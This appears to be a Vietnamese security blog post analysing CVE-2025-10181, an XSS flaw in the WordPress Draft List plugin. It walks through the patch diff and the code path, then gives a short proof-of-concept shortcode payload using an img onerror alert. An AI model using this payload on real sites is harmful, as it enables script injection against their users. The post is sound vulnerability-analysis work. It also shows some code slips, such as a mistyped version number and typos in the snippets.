---
title: CVE-2025-10181 Analysis & POC
description: Security Vulnerability in WordPress  Draft List Plugin.
date: 2025-09-22 15:38:00 +0700
categories: [Vulnerabilities, CVE Analyst]
tags: [analyst, plugin, xss]
---

Lỗ hổng trong plugin ** Draft List** trước phiên bản **2.6.1**. Dữ liệu được lấy từ **GET** request được in trực tiếp vào **HTML attribute**, **reflected XSS** xảy ra khi người dùng có đặc quyền truy cập vào đường dẫn do attack cung cấp.
- **CVE ID**: [CVE-2025-10181](https://www.cve.org/CVERecord?id=CVE-2025-10181)
- **Product**: [WordPress  Draft List Plugin](https://wordpress.org/plugins/simple-draft-list)
- **Vulnerability Type**: Cross Site Scripting
- **Affected Versions**: <= 2.6
- **CVSS severity**: Low (6.5)
- **Required Privilege**: Contributor

## Requirements
- [**Local WordPress and Debugging**](https://w41bu1.github.io/posts/wordpress-local-and-debugging/)
- ** Draft List**: v3.3.23(vul) và v2.6.1(fix)
- **diff tool**: **meld** hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version

## Analysis
### Patch Diff
Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.
Có sự khác biệt rõ ở file **inc/create-lists.php**.

**Bản lỗi**:

```php
$template   = html_entity_decode( $template );
```

**Bản vá**:

```php
$allowed_list = draft_list_allowed_html();

$template   = wp_kses( html_entity_decode( $template ), $allowed_list );

function draft_list_allowed_html() {

	$allowed_list = array(
		'a'          => array(
			'class' => array(),
			'href'  => array(),
			'rel'   => array(),
			'title' => array(),
		),
		'abbr'       => array(
			'title' => array(),
		),
		// Other logic
	);

	return $allowed_list;
}
```

Bản vá sử dụng [`wp_kses`](https://developer.wordpress.org/reference/functions/wp_kses/) để loại bỏ tất cả thẻ, thuộc tính hoặc giá trị không hợp lệ => Ngăn chặn tấn công XSS từ nội dung người dùng.

![Patch Diff](images/posts/2025-09-22-CVE-2025-10181/patch_diff.png)

### How It Work?
Trong cùng file **inc/create-lists.php**:

1. Shortcode với tên `drafts` được đăng ký bằng hàm `add_shortcode` nhận `draft_list_shortcode` làm callback.

```php
add_shortcode( 'drafts', 'draft_list_shortcode' );
```

2. `draft_list_shortcode` kiểm tra tồn tại và lấy các **attribute** của shortcode, sau đó trả về kết quả của `draft_list_generate_code`, với các đối số là những biến đã được khởi tạo và xử lý trước đó.

```php
function draft_list_shortcode( $paras = '' ) {
	// other logic
	$template  = '';

	if ( array_key_exists( 'template', $paras ) ) {
		$template = $paras['template'];
	}
	// other logic
	
	return draft_list_generate_code( $limit, $type, $order, $scheduled, $folder, $date, $created, $modified, $template, $words, $pending );
}
```

3. `draft_list_generate_code` là hàm dùng để tạo mã **HTML** danh sách các bài viết nháp (**drafts**) dựa trên các tham số đầu vào.

```php
function draft_list_generate_code_template_only( $drafts, $template = '', $list_limit = 0, ... ) {
    $code = '';
    $template = html_entity_decode( $template );
	$erorr = false

	// Kiểm tra template để đảm bảo rằng nó có chứa tag bắt buộc {{draft}} hoặc %draft%.
	if ( strpos( $template, '%draft%' ) === false && strpos( $template, '{{draft}}' ) === false ) {
		$code .= draft_list_report_error( __( 'The template must include the {{draft}} tag', 'simple-draft-list' ), $plugin_name, false );
		$error = true;
	}

	if (!error){
		$status = array( 'draft' );

		// Lấy danh sách có post có status=draft 
		$args = array(
			'post_status' => $status,
			'post_type'   => $type,
			'numberposts' => 99,
			'orderby'     => $sort_field,
			'sort_order'  => $sort_sequence,
		);

		$drafts = get_posts( $args );

		// Duyệt các draft
		$valid_draft = 1;
		foreach ( $drafts as $draft_data ) {
			if ( $valid_draft > $list_limit && $list_limit > 0 ) break;

			$draft_title = $draft_data->post_title;

			if ( $list ) $this_line = "\t<li>"; else $this_line = '';
			$this_line .= $template;
			if ( $list ) $this_line .= "</li>";

			$code .= $this_line . "\n";
			$valid_draft++;
		}
	}

    return $code;
}
```

Với mỗi `$draft_data`, nội dung của `$template` được concat trực tiếp vào `$this_line`.

Sau đó `$this_line` được concat vào `$code`.

Cuối cùng `$code` là toàn bộ HTML được trả về và hiển thị trong trình duyệt.

**Điều quan trọng**:

- Hàm không **lọc** hay **escape** `$template` trước khi concat, nên nếu `$template` chứa payload XSS, payload đó sẽ được in thẳng ra HTML.
- Ta cần điều kiện `!error`=`true` để `foreach ( $drafts as $draft_data )` được diễn ra => cần có `{{draft}}` hoặc `%draft%` trong `$template`

## Exploit 
### Detect XSS
Tạo post mới với shortcode `drafts` chứa attribute `template` chứa XSS payload và **save draft**:

```
[drafts template='{{draft}} <img src=x onerror=alert(document.domain)>']
```

**View Source**

```html
<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained"><a href="http://localhost/wp-admin/post.php?post=110&amp;action=edit" rel="nofollow">tét</a> <img decoding="async" src="x">
Privacy Policy <img decoding="async" src="x">

</div>
```

---